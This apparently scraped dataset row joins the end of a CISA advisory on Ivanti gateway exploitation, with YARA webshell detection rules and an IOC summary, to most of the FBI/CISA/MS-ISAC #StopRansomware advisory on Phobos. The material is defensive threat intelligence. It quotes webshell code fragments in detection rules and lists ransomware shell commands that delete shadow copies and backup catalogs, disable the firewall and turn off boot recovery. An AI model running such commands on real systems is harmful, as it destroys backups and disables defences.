Cyber actors may use web shells on internal- and 
external-facing web servers to establish persistent 
access to systems. 
Execution 
Technique Title 
ID 
Use 
Command and 
Scripting Interpreter: 
PowerShell 
T1059.001 
Cyber actors leverage code execution from 
request parameters that are decoded from hex to 
base64 decoded, then passed to 
Assembly.Load(), which is used to execute 
arbitrary PowerShell commands. 
Exploitation for Client 
Execution 
T1203 
Cyber actors will exploit software vulnerabilities 
such as command-injection and achieve 
unauthenticated remote code execution (RCE). 
 
 
 
 
 
Page 25 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
APPENDIX D: DETECTION METHODS 
 
rule apt_webshell_pl_complyshell: UTA0178 
{ 
    meta: 
        author = ""threatintel@volexity.com"" 
        date = ""2023-12-13"" 
        description = ""Detection for the COMPLYSHELL webshell."" 
        hash1 = ""8bc8f4da98ee05c9d403d2cb76097818de0b524d90bea8ed846615e42cb031d2"" 
        os = ""linux"" 
        os_arch = ""all"" 
        report = ""TIB-20231215"" 
        scan_context = ""file,memory"" 
        last_modified = ""2024-01-09T10:05Z"" 
        license = ""See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"" 
        rule_id = 9995 
        version = 4 
 
    strings: 
        $s = ""eval{my $c=Crypt::RC4->new("" 
 
    condition: 
        $s 
} 
 
rule apt_webshell_aspx_glasstoken: UTA0178 
{ 
    meta: 
        author = ""threatintel@volexity.com"" 
        date = ""2023-12-12"" 
 
 
 
Page 26 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
        description = ""Detection for a custom webshell seen on external facing server. The webshell 
contains two functions, the first is to act as a Tunnel, using code borrowed from reGeorg, the 
second is custom code to execute arbitrary .NET code."" 
        hash1 = ""26cbb54b1feb75fe008e36285334d747428f80aacdb57badf294e597f3e9430d"" 
        os = ""win"" 
        os_arch = ""all"" 
        report = ""TIB-20231215"" 
        scan_context = ""file,memory"" 
        last_modified = ""2024-01-09T10:08Z"" 
        license = ""See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"" 
        rule_id = 9994 
        version = 5 
 
    strings: 
        $s1 = ""=Convert.FromBase64String(System.Text.Encoding.Default.GetString("" ascii 
        $re = /Assembly\.Load\(errors\)\.CreateInstance\(""[a-z0-9A-Z]{4,12}""\).GetHashCode\(\);/ 
 
    condition: 
        for any i in (0..#s1): 
            ( 
                $re in (@s1[i]..@s1[i]+512) 
            ) 
} 
 
rule webshell_aspx_regeorg 
{ 
    meta: 
        author = ""threatintel@volexity.com"" 
        date = ""2018-08-29"" 
        description = ""Detects the reGeorg webshell based on common strings in the webshell. May 
also detect other webshells which borrow code from ReGeorg."" 
 
 
 
Page 27 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
        hash = ""9d901f1a494ffa98d967ee6ee30a46402c12a807ce425d5f51252eb69941d988"" 
        os = ""win"" 
        os_arch = ""all"" 
        reference = ""https://github.com/L-codes/Neo-reGeorg/blob/master/templates/tunnel.aspx"" 
        report = ""TIB-20231215"" 
        scan_context = ""file,memory"" 
        last_modified = ""2024-01-09T10:04Z"" 
        license = ""See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"" 
        rule_id = 410 
        version = 7 
 
    strings: 
        $a1 = ""every office needs a tool like Georg"" ascii 
        $a2 = ""cmd = Request.QueryString.Get(\""cmd\"")"" ascii 
        $a3 = ""exKak.Message"" ascii 
 
        $proxy1 = ""if (rkey != \""Content-Length\"" && rkey != \""Transfer-Encoding\"")"" 
 
        $proxy_b1 = ""StreamReader repBody = new StreamReader(response.GetResponseStream(), 
Encoding.GetEncoding(\""UTF-8\""));"" ascii 
        $proxy_b2 = ""string rbody = repBody.ReadToEnd();"" ascii 
        $proxy_b3 = ""Response.AddHeader(\""Content-Length\"", rbody.Length.ToString());"" ascii 
 
    condition: 
        any of ($a*) or 
        $proxy1 or 
        all of ($proxy_b*) 
} 
 
rule hacktool_py_pysoxy 
 
 
 
Page 28 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
{ 
    meta: 
        author = ""threatintel@volexity.com"" 
        date = ""2024-01-09"" 
        description = ""SOCKS5 proxy tool used to relay connections."" 
        hash1 = ""e192932d834292478c9b1032543c53edfc2b252fdf7e27e4c438f4b249544eeb"" 
        os = ""all"" 
        os_arch = ""all"" 
        reference = ""https://github.com/MisterDaneel/pysoxy/blob/master/pysoxy.py"" 
        report = ""TIB-20240109"" 
        scan_context = ""file,memory"" 
        last_modified = ""2024-01-09T13:45Z"" 
        license = ""See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"" 
        rule_id = 10065 
        version = 3 
 
    strings: 
        $s1 = ""proxy_loop"" ascii 
        $s2 = ""connect_to_dst"" ascii 
        $s3 = ""request_client"" ascii 
        $s4 = ""subnegotiation_client"" ascii 
        $s5 = ""bind_port"" ascii 
 
    condition: 
        all of them 
} 
 
rule apt_webshell_py_categorical: UTA0178 
{ 
    meta: 
 
 
 
Page 29 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
        author = ""threatintel@volexity.com"" 
        date = ""2024-01-18"" 
        description = ""Detection for the CATEGORICAL webshell."" 
        os = ""linux"" 
        os_arch = ""all"" 
        scan_context = ""file,memory"" 
        severity = ""critical"" 
 
    strings: 
        $s1 = ""exec(zlib.decompress(aes.decrypt(base64.b64decode"" ascii 
        $s2 = ""globals()[dskey].pop('result',None)"" ascii 
        $s3 = ""dsid=request.cookies.get('DSID'"" ascii 
 
    condition: 
        any of ($s*) 
} 
 
",Threat Actors Exploit Multiple Vulnerabilities in Ivanti Connect Secure and Policy Secure Gateways,"{
  ""ID"": ""AA24-060B"",
  ""URL"": ""https://www.cisa.gov/tlp"",
  ""Title"": ""Threat Actors Exploit Multiple Vulnerabilities in Ivanti Connect Secure and Policy Secure Gateways"",
  ""Release Date"": ""February 29, 2024"",
  ""Last Updated"": ""February 29, 2024"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Ivanti Connect Secure and Ivanti Policy Secure gateways""
  ],
  ""Summary"": ""This advisory alerts of ongoing exploitation of vulnerabilities in Ivanti gateway appliances that could allow unauthorized access and command execution, potentially compromising sensitive information."",
  ""Procedures"": {
    ""Compromise Detection"": ""Threat actors are able to deceive Ivanti's internal and external Integrity Checker Tool, leading to undetected compromises on the affected gateways."",
    ""Persistence Mechanisms"": ""Attackers can maintain persistence even after device resets, making it difficult to eradicate them from affected systems.""
  },
  ""Tactics"": {
    ""Initial Access"": ""Exploiting known vulnerabilities allows threat actors initial access without proper authentication."",
    ""Persistence"": ""Due to the ability to bypass Integrity Checker Tools and maintain root-level access, threat actors can retain control over the compromised devices."",
    ""Evasion"": ""Threat actors can manipulate logs and other indicators to evade detection, complicating forensic investigations.""
  },
  ""Techniques"": {
    ""Exploitation of Public-Facing Applications"": ""Exploiting vulnerabilities in the Ivanti VPN appliances to gain unauthenticated access and execute commands remotely."",
    ""Abuse of System Features"": ""Using Integrity Checker Tool failures to bypass security checks and achieve persistent access inside the compromised networks."",
    ""Data Manipulation"": ""Manipulating digital evidence and altering security logs to hide their tracks.""
  },
  ""Threat Actions"": [
    ""Exploiting Ivanti Connect Secure and Ivanti Policy Secure Gateway vulnerabilities"",
    ""Insertion of web shells for backdoor access"",
    ""Data exfiltration and credential access""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""88.119.169.227"",
      ""103.13.28.40"",
      ""46.8.68.100""
    ],
    ""Domains"": [
      ""gpoaccess.com"",
      ""webb-institute.com"",
      ""symantke.com""
    ],
    ""Hashes"": [
      ""ed4b855941d6d7e07aacf016a2402c4c870876a050a4a547af194f5a9b47945f""
    ]
  },
  ""Mitigation Strategies"": ""Organizations using Ivanti appliances are urged to immediately limit internet connections on these devices, update all software and firmware, and convert all SSL VPN connections to unprivileged accounts. Additionally, rigorous network monitoring and incident response strategies should be implemented."",
  ""References"": [
    ""https://www.cisa.gov/tlp"",
    ""https://www.cisa.gov/china-cyber-threat-overview-and-advisories""
  ]
}"
02-29-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa24-060a-stopransomware-phobos-ransomware_1.pdf?alt=media&token=223980fd-a247-4868-a9ff-324da5eee89c," 
 
 
 
 
 
 
 
 
  
 
U.S organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity 
Advisory, contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-
0870. When available, please include the following information regarding the incident: date, time, and location of 
the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the 
submitting company or organization; and a designated point of contact.  
This document is distributed as TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when 
information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures 
for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without 
restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp. 
Product ID: AA24-060A 
 
February 29, 2024 
Co-Authored by: 
TLP:CLEAR 
TLP:CLEAR 
#StopRansomware: Phobos Ransomware 
SUMMARY 
Note: This joint Cybersecurity Advisory (CSA) is part of 
an ongoing #StopRansomware effort to publish 
advisories for network defenders that detail various 
ransomware variants and ransomware threat actors. 
These #StopRansomware advisories include recently 
and historically observed tactics, techniques, and 
procedures (TTPs) and indicators of compromise 
(IOCs) to help organizations protect against 
ransomware. Visit stopransomware.gov to see all 
#StopRansomware advisories and to learn more about 
other ransomware threats and no-cost resources. 
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency 
(CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this 
joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants 
observed as recently as February 2024, according to open source reporting. Phobos is structured as 
a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting 
state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. 
These incidents targeted municipal and county governments, emergency services, education, public 
healthcare, and other critical infrastructure entities to successfully ransom several million U.S. 
dollars.[1],[2] 
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the 
Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other 
ransomware incidents. 
For a downloadable copy of indicators of compromise (IOCs), see: 
• 
AA24-060A (STIX XML, 148KB) 
• 
AA24-060A (STIX JSON, 120KB) 
Actions to take today to mitigate 
Phobos ransomware activity: 
• 
Secure RDP ports to prevent threat 
actors from abusing and leveraging 
RDP tools. 
• 
Prioritize remediating known 
exploited vulnerabilities. 
• 
Implement EDR solutions to disrupt 
threat actor memory allocation 
techniques. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 2 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE 
ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE 
ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping 
and CISA’s Decider Tool. 
Overview 
According to open source reporting, Phobos ransomware is likely connected to numerous variants 
(including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in 
Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such 
as Smokeloader, Cobalt Strike, and Bloodhound. These tools are all widely accessible and easy to 
use in various operating environments, making it (and associated variants) a popular choice for many 
threat actors.[3],[4] 
Reconnaissance and Initial Access 
Phobos actors typically gain initial access to vulnerable networks by leveraging phishing campaigns 
[T1598] to drop hidden payloads or using internet protocol (IP) scanning tools, such as Angry IP 
Scanner, to search for vulnerable Remote Desktop Protocol (RDP) ports [T1595.001] or by leveraging 
RDP on Microsoft Windows environments.[5],[6] 
Once they discover an exposed RDP service, the actors use open source brute force tools to gain 
access [T1110]. If Phobos actors gain successful RDP authentication [T1133][T1078] in the targeted 
environment, they perform open source research to create a victim profile and connect the targeted IP 
addresses to their associated companies [T1593]. Threat actors leveraging Phobos have notably 
deployed remote access tools to establish a remote connection within the compromised network 
[T1219].[7] 
Alternatively, threat actors send spoofed email attachments [T1566.001] that are embedded with 
hidden payloads [T1204.002] such as SmokeLoader, a backdoor trojan that is often used in 
conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s 
system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate 
data from the compromised system. 
Execution and Privilege Escalation 
Phobos actors run executables like 1saas.exe or cmd.exe to deploy additional Phobos payloads that 
have elevated privileges enabled [TA0004]. Additionally, Phobos actors can use the previous 
commands to perform various windows shell functions. The Windows command shell enables threat 
actors to control various aspects of a system, with multiple permission levels required for different 
subsets of commands [T1059.003][T1105].[8] 
 
 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 3 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Smokeloader Deployment 
Phobos operations feature a standard three phase process to decrypt a payload that allows the threat 
actors to deploy additional destructive malware.[9] 
For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API 
functions—which opens an entry point, enabling code to be injected into running processes and 
allowing the malware to evade network defense tools [T1055.002]. In the second phase, a stealth 
process is used to obfuscate command and control (C2) activity by producing requests to legitimate 
websites [T1001.003].[10] 
Within this phase, the shellcode also sends a call from the entry point to a memory container 
[T1055.004] and prepares a portable executable for deployment in the final stage 
[T1027.002][T1105][T1140]. 
Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored 
memory, which is then sent to be extracted from a SHA 256 hash as a payload.[7] Following 
successful payload decryption, the threat actors can begin downloading additional malware. 
Additional Phobos Defense Evasion Capabilities 
Phobos ransomware actors have been observed bypassing organizational network defense protocols 
by modifying system firewall configurations using commands like netsh firewall set opmode 
mode=disable [T1562.004]. Additionally, Phobos actors can evade detection by using the following 
tools: Universal Virus Sniffer, Process Hacker, and PowerTool [T1562]. 
Persistence and Privilege Escalation 
According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the 
bcdedit[.]exe control mechanism. Phobos has also been observed using Windows Startup folders 
and Run Registry Keys such as C:/Users\Admin\AppData\Local\directory [T1490][T1547.001] 
to maintain persistence within compromised environments.[5] 
Additionally, Phobos actors have been observed using built-in Windows API functions [T1106] to steal 
tokens [T1134.001], bypass access controls, and create new processes to escalate privileges by 
leveraging the SeDebugPrivilege process [T1134.002]. Phobos actors attempt to authenticate using 
cached password hashes on victim machines until they reach domain administrator access 
[T1003.005]. 
Discovery and Credential Access 
Phobos actors additionally use open source tools [T1588.002] such as Bloodhound and Sharphound 
to enumerate the active directory [T1087.002]. Mimikatz and NirSoft, as well as Remote Desktop 
Passview to export browser client credentials [T1003.001][T1555.003], have also been used. 
Furthermore, Phobos ransomware is able to enumerate connected storage devices [T1082], running 
processes [T1057], and encrypt user files [T1083]. 
 
 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 4 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Exfiltration 
Phobos actors have been observed using WinSCP and Mega.io for file exfiltration.[11] They use 
WinSCP to connect directly from a victim network to an FTP server [T1071.002] they control [TA0010]. 
Phobos actors install Mega.io [T1048] and use it to export victim files directly to a cloud storage 
provider [T1567.002]. Data is typically archived as either a .rar or .zip file [T1560] to be later 
exfiltrated. They target legal documentation, financial records, technical documents (including network 
architecture), and databases for commonly used password management software [T1555.005]. 
Impact 
After the exfiltration phase, Phobos actors then hunt for backups. They use vssadmin.exe and 
Windows Management Instrumentation command-line utility (WMIC) to discover and delete volume 
shadow copies in Windows environments. This prevents victims from recovering files after encryption 
has taken place [T1047][T1490]. 
Phobos.exe contains functionality to encrypt all connected logical drives on the target host [T1486]. 
Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a 
unique ransom note which is embedded in the executable. After the ransom note has populated on 
infected workstations, Phobos ransomware continues to search for and encrypt additional files. 
Most extortion [T1657] occurs via email; however, some affiliate groups have used voice calls to 
contact victims. In some cases, Phobos actors have used onion sites to list victims and host stolen 
victim data. Phobos actors use various instant messaging applications such as ICQ, Jabber, and QQ 
to communicate [T1585]. See Figure 2 for a list of email providers used by the following Phobos 
affiliates: Devos, Eight, Elbie, Eking, and Faust.[6] 
 
Figure 1: Phobos Affiliate Providers List 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 5 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
INDICATORS OF COMPROMISE (IOCs) 
See Table 1 through 6 for IOCs obtained from CISA and the FBI investigations from September through 
November 2023.Ass 
Table 1: Associated Phobos Domains 
Associated Phobos Domains 
adstat477d[.]xyz 
demstat577d[.]xyz [12] 
serverxlogs21[.]xyz 
Table 2: Observed Phobos Shell Commands 
Shell Commands 
vssadmin delete shadows /all /quiet [T1490]  
netsh advfirewall set currentprofile state off 
wmic shadowcopy delete 
netsh firewall set opmode mode=disable [T1562.004] 
bcdedit /set {default} bootstatuspolicy ignoreallfailures [T1547.001] 
bcdedit /set {default} recoveryenabled no [T1490] 
wbadmin delete catalog -quiet 
mshta C:\%USERPROFILE%\Desktop\info.hta [T1218.005] 
mshta C:\%PUBLIC%\Desktop\info.hta 
mshta C:\info.hta 
The commands above are observed during the execution of a Phobos encryption executable. A 
Phobos encryption executable spawns a cmd.exe process, which then executes the commands listed 
in Table 1 with their respective Windows system executables. When the commands above are 
executed on a Windows system, volume shadow copies are deleted and Windows Firewall is 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 6 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
disabled. Additionally, the system’s boot status policy is set to boot even when there are errors during 
the boot process, and automatic recovery options, like Windows Recovery Environment (WinRE), are 
disabled for the given boot entry. The system’s backup catalog is also deleted. Finally, the Phobos 
ransom note is displayed to the end user using mshta.exe. 
Table 3: Observed Phobos Registry Keys 
Registry Keys 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<Phobos exe name> 
C:/Users\Admin\AppData\Local\directory 
Table 4: Observed Phobos Actor Email Addresses 
Email Addresses 
AlbetPattisson1981@protonmail[.]com 
henryk@onionmail[.]org 
atomicday@tuta[.]io 
info@fobos[.]one 
axdus@tuta[.]io 
it.issues.solving@outlook[.]com 
barenuckles@tutanota[.]com 
JohnWilliams1887@gmx[.]com 
Bernard.bunyan@aol[.]com 
jonson_eight@gmx[.]us 
bill.g@gmx[.]com 
joshuabernandead@gmx[.]com 
bill.g@msgsafe[.]io 
LettoIntago@onionmail[.]com 
bill.g@onionmail[.]org 
Luiza.li@tutanota[.]com 
bill.gTeam@gmx[.]com 
MatheusCosta0194@gmx[.]com 
blair_lockyer@aol[.]com 
mccreight.ellery@tutanota[.]com 
CarlJohnson1948@gmx[.]com 
megaport@tuta[.]io 
cashonlycash@gmx[.]com 
miadowson@tuta[.]io 
chocolate_muffin@tutanota[.]com 
MichaelWayne1973@tutanota[.]com 
claredrinkall@aol[.]com 
normanbaker1929@gmx[.]com 
clausmeyer070@cock[.]li 
nud_satanakia@keemail[.]me 
colexpro@keemail[.]me 
please@countermail[.]com 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 7 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Email Addresses 
cox.barthel@aol[.]com 
precorpman@onionmail[.]org 
crashonlycash@gmx[.]com 
recovery2021@inboxhub[.]net 
everymoment@tuta[.]io 
recovery2021@onionmail[.]org 
expertbox@tuta[.]io 
SamuelWhite1821@tutanota[.]com 
fastway@tuta[.]io 
SaraConor@gmx[.]com 
fquatela@techie[.]com 
secdatltd@gmx[.]com 
fredmoneco@tutanota[.]com 
skymix@tuta[.]io 
getdata@gmx[.]com 
sory@countermail[.]com 
greenbookBTC@gmx[.]com 
spacegroup@tuta[.]io 
greenbookBTC@protonmail[.]com 
stafordpalin@protonmail[.]com 
helperfiles@gmx[.]com 
starcomp@keemail[.]me 
helpermail@onionmail[.]org 
xdone@tutamail[.]com 
helpfiles@onionmail[.]org 
xgen@tuta[.]io 
helpfiles102030@inboxhub[.]net 
xspacegroup@protonmail[.]com 
helpforyou@gmx[.]com 
zgen@tuta[.]io 
helpforyou@onionmail[.]org 
zodiacx@tuta[.]io 
Table 5: Observed Phobos Actor Telegram Username 
Telegram Username 
@phobos_support 
Table 6: Observed Phobos Actor Wickr Address 
Wickr Address 
• 
Vickre me 
 
 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 8 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Disclaimer: Organizations are encouraged to investigate the use of the IOCs in Table 7 for related 
signs of compromise prior to performing remediation actions. 
Table 7: Phobos IOCs from September through December 2023 
Associated IP 
Address 
File Type 
File Name 
SHA 256 Hash 
194.165.16[.]4 
(October 2023) 
Win32.exe 
Ahpdate.exe [13] 
0000599cbc6e5b0633c5a6261c79e4d3d810
05c77845c6b0679d854884a8e02f 
45.9.74[.]14 
(December 2023) 
 
147.78.47[.]224 
(December 2023) 
Executable 
and Linkable 
Format (ELF) 
[14] 
1570442295 
(Trojan Linux Mirai) 
7451be9b65b956ee667081e1141531514b1
ec348e7081b5a9cd1308a98eec8f0 
185.202.0[.]111 
(September 2023) 
Win32.exe 
[15] 
cobaltstrike_shellcode[.]exe (C2 
activity) 
 
185.202.0[.]111 
(December 2023)  
.txt [16] 
f1425cff3d28afe5245459afa6d7
985081bc6a62f86dce64c63dae
b2136d7d2c.bin (Trojan) 
 
Disclaimer: Organizations are encouraged to investigate the use of the file hashes in Tables 8 and 9 
for related signs of compromise prior to performing remediation actions. 
Table 8: Phobos Actor File Hashes Observed in October 2023 
Phobos Ransomware SHA 256 Malicious Trojan Executable File Hashes  
518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c 
9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c 
482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52 
c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763 
Table 9: Phobos Actor File Hashes from Open Source from November 2023 [17] 
Phobos Ransomware SHA 256 File Hashes 
58626a9bfb48cd30acd0d95debcaefd188ae794e1e0072c5bde8adae9bccafa6 
f3be35f8b8301e39dd3dffc9325553516a085c12dc15494a5e2fce73c77069ed 
518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c 
32a674b59c3f9a45efde48368b4de7e0e76c19e06b2f18afb6638d1a080b2eb3 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 9 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Phobos Ransomware SHA 256 File Hashes 
2704e269fb5cf9a02070a0ea07d82dc9d87f2cb95e60cb71d6c6d38b01869f66 
fc4b14250db7f66107820ecc56026e6be3e8e0eb2d428719156cf1c53ae139c6 
a91491f45b851a07f91ba5a200967921bf796d38677786de51a4a8fe5ddeafd2 
MITRE ATT&CK TECHNIQUES 
See Table 10 through 22 for all threat actor tactics and techniques referenced in this advisory. 
Table 10: Phobos Threat Actors ATT&CK Techniques for Enterprise – Reconnaissance 
Technique Title 
ID 
Use 
Search Open 
Websites/Domains 
T1593 
Phobos actors perform open source research to 
find information about victims that can be used 
during targeting to create a victim profile. 
Scanning IP Blocks 
T1595.001 
Phobos actors used IP scanning tools to include 
Angry IP Scanner to search for vulnerable RDP 
ports. 
Phishing for Information 
T1598 
Phobos actors use phishing campaigns to social 
engineer information from users and gain access 
to vulnerable RDP ports. 
Table 11: Phobos Threat Actors ATT&CK Techniques for Enterprise – Resource Development 
Technique Title 
ID 
Use 
Establish Accounts 
T1585 
Phobos actors establish accounts to 
communicate. 
Obtain Capabilities: Tool 
T1588.002 
Phobos actors used open source tools in their 
attack. 
Table 12: Phobos Threat Actors ATT&CK Techniques for Enterprise – Initial Access 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
Following successful RDP authentication, 
Phobos actors search for IP addresses and pair 
them with their associated computer to create a 
victim profile. 
External Remote Services 
T1133 
Phobos actors may leverage external-facing 
remote services to initially access and/or persist 
within a network. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 10 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Phishing: Spearphishing 
Attachment 
T1566.001 
Phobos actors used a spoofed email attachment 
to execute attack. 
Table 13: Phobos Threat Actors ATT&CK Techniques for Enterprise – Execution 
Technique Title 
ID 
Use 
Windows Management 
Instrumentation 
T1047 
Phobos actors used Windows Management 
Instrumentation command-line utility (WMIC) to 
prevent victims from recovering files. 
Windows Command Shell 
T1059.003 
Phobos actors can use the previous commands 
to perform commands with windows shell 
functions.  
Native API 
T1106 
Phobos actors used open source tools to 
enumerate the active directory. 
Malicious File 
T1204.002 
Phobos actors attached a malicious email 
attachment to deliver ransomware. 
Table 14: Phobos Threat Actors ATT&CK Techniques for Enterprise – Persistence 
Technique Title 
ID 
Use 
Registry Run Keys / Startup 
Folder 
T1547.001 
Phobos ransomware operates using the 
Exec.exe control mechanism and has been 
observed using Windows Startup folders and Run 
Registry Keys. 
Table 15: Phobos Threat Actors ATT&CK Techniques for Enterprise – Privilege Escalation 
Technique Title 
ID 
Use 
Privilege Escalation 
TA0004 
Phobos actors use run commands like 
1saas.exe, or cmd.exe to deploy additional 
Phobos payloads with escalated privileges. 
Portable Executable Injection 
T1055.002 
Phobos actors use Smokeloader to inject code 
into running processes to identify an entry point 
through enabling a VirtualAlloc or 
VirtualProtect process. 
Asynchronous Procedure Call 
T1055.004 
During phase two of execution, Phobos 
ransomware sends a call back from an identified 
entry point. 
Access Token Manipulation: 
Token Impersonation/Theft 
T1134.001 
Phobos actors can use Windows API functions to 
steal tokens. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 11 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Create Process with Token 
T1134.002 
Phobos actors used Windows API functions to 
steal tokens, bypass access controls and create 
new processes. 
Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion 
Technique Title 
ID 
Use 
Software Packing 
T1027.002 
Phobos actors deployed a portable executable 
(PE) to conceal code. 
Embedded Payloads 
T1027.009 
Phobos actors embedded the ransomware as a 
hidden payload by using Smokeloader. 
Deobfuscate/Decode Files or 
Information 
T1140 
During phase two of execution, Phobos actors’ 
malware stores and decrypts information. 
System Binary Proxy Execution: 
Mshta 
T1218.005 
Phobos actors used Mshta to execute malicious 
files. 
Impair Defenses 
T1562 
Phobos actors can use Universal Virus Sniffer, 
Process Hacker, and PowerTool to evade 
detection. 
Disable or Modify System 
Firewall 
T1562.004 
Phobos ransomware has been observed 
bypassing organizational network defense 
protocols through modifying system firewall 
configurations. 
Table 17: Phobos Threat Actors ATT&CK Techniques for Enterprise – Credential Access 
Technique Title 
ID 
Use 
OS Credential Dumping: LSASS 
Memory 
T1003.001 
Phobos actors used Mimikatz to export 
credentials. 
OS Credential Dumping: 
Cached Domain Credentials 
T1003.005 
Phobos actors use cached domain credentials to 
authenticate as the domain administrator in the 
event a domain controller is unavailable. 
Brute Force 
T1110 
Phobos actors may use brute force techniques to 
gain access to accounts when passwords are 
unknown or when password hashes are 
obtained. 
Credentials from Password 
Stores 
T1555 
Phobos actors may search for common password 
storage locations to obtain user credentials. 
Credentials from Password 
Stores: Credentials from Web 
Browsers 
T1555.003 
Phobos actors use Nirsoft or Passview to export 
client credentials from web browsers. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 12 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Technique Title 
ID 
Use 
Phobos actors search for stored credentials in 
browser clients once they gain initial network 
access. 
Credentials from Password 
Stores: Password Managers 
T1555.005 
Phobos actors targeted victim’s databases for 
password management software. 
Table 18: Phobos Threat Actors ATT&CK Techniques for Enterprise – Discovery 
Technique Title 
ID 
Use 
Process Discovery 
T1057 
Phobos ransomware is able to run processes. 
System Information Discovery 
T1082 
Phobos ransomware is able to enumerate 
connected storage devices. 
File and Directory Discovery 
T1083 
Phobos ransomware can encrypt user files. 
Domain Account 
T1087.002 
Phobos threat actor used Bloodhound and 
Sharphound to enumerate the active directory. 
Table 19: Phobos Threat Actors ATT&CK Techniques for Enterprise – Collection 
Technique Title 
ID 
Use 
Archive Collected Data 
T1560 
Phobos threat actors archive data as either a 
.rar or .zip file to be later exfiltrated. 
Table 20: Phobos Threat Actors ATT&CK Techniques for Enterprise – Command and Control 
Technique Title 
ID 
Use 
Data Obfuscation: Protocol 
Impersonation 
T1001.003 
Phobos actors used a stealth process to 
obfuscate C2 activity. 
File Transfer Protocols 
T1071.002 
Phobos threat actors used WinSCP to connect the 
victim’s network to an FTP server. 
Ingress Tool Transfer 
T1105 
Phobos ransomware extracts its final payload 
from the hashed file. 
Remote Access Software 
T1219 
Phobos threat actors used remote access tools to 
establish a remote connection within victim’s 
network. 
Table 21: Phobos Threat Actors ATT&CK Techniques for Enterprise – Exfiltration 
Technique Title 
ID 
Use 
Exfiltration 
TA0010 
Phobos threat actors may use exfiltration 
techniques to steal data from your network. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 13 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
Technique Title 
ID 
Use 
Exfiltration Over Alternative 
Protocol 
T1048 
Phobos threat actors use software to export files 
to a cloud. 
Exfiltration to Cloud Storage 
T1567.002 
Phobos threat actors use Mega.io to exfiltrate 
data to a cloud storage service rather than over 
their primary command and control channel. 
Table 22: Phobos Threat Actors ATT&CK Techniques for Enterprise – Impact 
